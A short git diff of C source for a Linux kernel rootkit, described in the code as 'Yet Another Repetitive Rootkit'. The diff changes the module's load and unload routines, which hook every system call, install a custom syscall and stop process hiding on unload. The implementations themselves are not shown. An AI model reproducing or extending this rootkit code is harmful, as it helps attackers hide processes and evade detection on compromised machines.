@@ -159,12 +159,8 @@ int unhook_syscalls(syscallHookingMethods method) {
 static int __init yarr_loader(void) {
 	debug("Loading YARR into kernel...\n");
 
-	// Hook the system calls (right now patching system_call() the handler of
-	// IRQ 0x80).
+	// Hook the system calls.
 	hook_syscalls(HOOK_EACH_SYSCALL);
-
-	// Install yarrIntrDesc().
-//	init_interrupt();
 
 	// Install yarrSyscall().
 	init_syscall();
@@ -182,11 +178,8 @@ static int __init yarr_loader(void) {
 static void __exit yarr_unloader(void) {
 	debug("Unloading YARR from kernel...\n");
 
-	// Restore the interrupt.
-	if (intr_taken != -1) {
-		uninstallIntrDesc(intr_taken);
-		debug("Interrupt %d released.\n", intr_taken);
-	}
+	// End hiding processes.
+	exit_hideproc();
 
 	// Restore the syscall.
 	if (syscall_taken != -1) {
@@ -208,3 +201,4 @@ MODULE_AUTHOR("Ole <olelen@gmail.com>");
 MODULE_DESCRIPTION("Yet Another Repetitive Rootkit");
 
 #endif /* __YARR_IM_A_MIGHTY_PIRATE */
+
